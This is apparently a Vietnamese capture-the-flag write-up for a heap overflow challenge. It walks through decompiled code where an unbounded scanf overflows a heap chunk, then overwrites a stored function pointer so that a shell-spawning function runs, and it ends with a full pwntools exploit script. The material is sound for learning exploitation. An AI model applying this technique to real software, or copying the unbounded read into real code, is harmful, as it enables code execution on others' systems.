# Heap Overflow 2

**tiếp tục với một chall sử dụng kĩ thuật Heap Overflow**

Khi chương trình ghi một biến thực thi được lên heap, **ta cần phải chú ý biến đó vì nếu như ta có thể thay đổi biến đó thành giá trị khác theo ý muốn, ta hoàn toàn có thể điều khiển luồng thực thi của chương trình**. Với lỗi heap overflow, việc thay đổi biến đó sẽ trở nên dễ dàng hơn và ta có thể thay đổi biến đó một cách đơn giản hơn.

## ida 

```c 
__int64 add_cat()
{
  int v0; // ebx

  v0 = count;
  animal_list[v0] = malloc(0x210uLL);
  *(_QWORD *)(animal_list[count] + 0x208LL) = cat_action;
  printf("Name of your new cat: ");
  __isoc99_scanf("%s", animal_list[count]);
  getchar();
  printf("Its age: ");
  __isoc99_scanf("%d", animal_list[count] + 0x200LL);
  printf("Added new cat at index %d\n", (unsigned int)count);
  return (unsigned int)++count;
}

__int64 __fastcall animal_say(int a1)
{
  return (*(__int64 (**)(void))(animal_list[a1] + 0x208LL))();
}

int human_action()
{
  puts("Yay, I get shell!");
  return system("/bin/sh");
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+0h] [rbp-10h] BYREF
  unsigned int v5; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v6; // [rsp+8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v4 = -1;
  v5 = -1;
  init(argc, argv, envp);
  do
  {
    menu();
    __isoc99_scanf("%d", &v4);
    getchar();
    if ( v4 == 4 )
      continue;
    if ( v4 > 4 )
    {
LABEL_17:
      puts("Invalid choice");
      continue;
    }
    switch ( v4 )
    {
      case 3:
        printf("Index: ");
        __isoc99_scanf("%d", &v5);
        if ( v5 <= 3 && animal_list[v5] )
          animal_say(v5);
        else
          puts("Invalid index");
        break;
      case 1:
        if ( count > 3 )
          goto LABEL_9;
        add_cat();
        break;
      case 2:
        if ( count > 3 )
        {
LABEL_9:
          puts("Maximum 4 pets only!");
          break;
        }
        add_dog();
        break;
      default:
        goto LABEL_17;
    }
  }
  while ( v4 != 5 );
  return 0;
}
```

**chương trình cho ta 4 option**, 1 là add_cat, 2 là add_dog , 3 là animal_say(), 4 là exit

**nhìn ngay ta thấy có lỗi HOF tại hàm add_cat** nên ta sẽ tập trung phân tích hàm này 

## khai thác

```c 
__int64 add_cat()
{
  int v0; // ebx

  v0 = count;
  animal_list[v0] = malloc(0x210uLL);
  *(_QWORD *)(animal_list[count] + 0x208LL) = cat_action;
  printf("Name of your new cat: ");
  __isoc99_scanf("%s", animal_list[count]);
  getchar();
  printf("Its age: ");
  __isoc99_scanf("%d", animal_list[count] + 0x200LL);
  printf("Added new cat at index %d\n", (unsigned int)count);
  return (unsigned int)++count;
}

__int64 __fastcall animal_say(int a1)
{
  return (*(__int64 (**)(void))(animal_list[a1] + 0x208LL))();
}
```

như ta đã thấy thì **animal_list[] là heap**

tại địa chỉ **animal_list[count] + 0x208LL** sẽ lưu địa chỉ của là **cat_action** 

tại hàm **animal_say()** thì nó sẽ thực thi địa chỉ **animal_list[count] + 0x208LL là cat_action**

đến đây rồi thì nghĩ ngay là hướng làm là ta hoàn toàn có thể **sử dụng lỗi HOF để ghi đè địa chỉ animal_list[count] + 0x208LL là cat_action thành human_action** vì nó có shell

![image](https://github.com/gookoosss/CTF/assets/128712571/3a54690e-7fe2-47b4-8433-a11b17d4fbf0)


ta tính được offset là 0x208 byte rồi, h ta ghi đè nó thành human_action thôi

```python 
payload = b'a'*0x208 + p64(exe.sym['human_action'])
p.sendlineafter(b'cat: ', payload)
p.sendlineafter(b'age: ', b'1')
```

cuối cùng ta chọn option 3 để thực thi hàm human_action và lấy shell thôi

![image](https://github.com/gookoosss/CTF/assets/128712571/ab0f5e8d-021a-4c42-b849-7e4cfccc6d0b)


## script

```python
from pwn import *

p = process('./hof2')
exe = ELF('./hof2')

gdb.attach(p, gdbscript = '''
b*0x00000000004013e5
b*0x0000000000401467
c
''')

input()

p.sendlineafter(b'> ', b'1')

payload = b'a'*0x208 + p64(exe.sym['human_action'])
p.sendlineafter(b'cat: ', payload)
p.sendlineafter(b'age: ', b'1')

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Index: ', b'0')

p.interactive()
```
